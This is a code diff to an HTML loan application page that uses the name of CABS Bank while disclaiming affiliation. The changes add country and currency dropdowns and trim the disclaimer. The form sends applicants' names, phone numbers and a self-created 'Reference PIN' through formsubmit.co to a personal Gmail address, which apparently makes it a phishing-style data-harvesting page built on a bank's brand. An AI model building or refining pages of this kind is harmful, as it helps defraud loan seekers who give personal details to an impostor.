@@ -57,6 +57,7 @@ button {
   font-size: 17px;
   font-weight: bold;
   border-radius: 6px;
+  cursor: pointer;
 }
 .disclaimer {
   background: #fff5e9;
@@ -73,7 +74,6 @@ footer {
 }
 </style>
 </head>
-
 <body>
 
 <header>
@@ -88,21 +88,36 @@ footer {
   <p class="disclaimer">
     CABS Loan Services is an independent business and is
     not affiliated with, endorsed by, or operated by
-    CABS Bank or its parent organization. The CABS name
-    is used here for independent business identification.
+    CABS Bank or its parent organization.
   </p>
 
   <form action="https://formsubmit.co/kipkiruibenard704@gmail.com"
         method="POST">
 
     <input type="hidden" name="_subject"
-           value="New CABS Loan Application">
-
+           value="New Loan Application">
     <input type="hidden" name="_captcha" value="true">
 
     <label>Full Name</label>
     <input type="text" name="Full Name"
            placeholder="Enter your full name" required>
+
+    <label>Country</label>
+    <select name="Country" id="country" required>
+      <option value="">Select your country</option>
+      <option value="Zimbabwe">Zimbabwe</option>
+      <option value="Kenya">Kenya</option>
+      <option value="South Africa">South Africa</option>
+      <option value="Zambia">Zambia</option>
+      <option value="Malawi">Malawi</option>
+      <option value="Botswana">Botswana</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <label>Currency Type</label>
+    <select name="Currency Type" id="currency" required>
+      <option value="">Select country first</option>
+    </select>
 
     <label>Phone Number</label>
     <input type="tel" name="Phone Number"
@@ -128,16 +143,48 @@ footer {
     <label>Reference PIN</label>
     <input type="text" name="Reference PIN"
            placeholder="Create an application reference code"
-           required maxlength="20">
+           maxlength="20" required>
 
     <button type="submit">Submit Application</button>
-
   </form>
 </div>
 
 <footer>
   © 2026 CABS Loan Services. Independent business.
 </footer>
+
+<script>
+const country = document.getElementById("country");
+const currency = document.getElementById("currency");
+
+const currencies = {
+  Zimbabwe: ["USD - US Dollar", "ZWG - Zimbabwe Gold"],
+  Kenya: ["KES - Kenyan Shilling"],
+  "South Africa": ["ZAR - South African Rand"],
+  Zambia: ["ZMW - Zambian Kwacha"],
+  Malawi: ["MWK - Malawian Kwacha"],
+  Botswana: ["BWP - Botswana Pula"],
+  Other: ["USD - US Dollar"]
+};
+
+country.addEventListener("change", function () {
+  currency.innerHTML = "";
+
+  const options = currencies[this.value] || [];
+
+  const placeholder = document.createElement("option");
+  placeholder.value = "";
+  placeholder.textContent = "Select currency";
+  currency.appendChild(placeholder);
+
+  options.forEach(function (item) {
+    const option = document.createElement("option");
+    option.value = item;
+    option.textContent = item;
+    currency.appendChild(option);
+  });
+});
+</script>
 
 </body>
 </html>
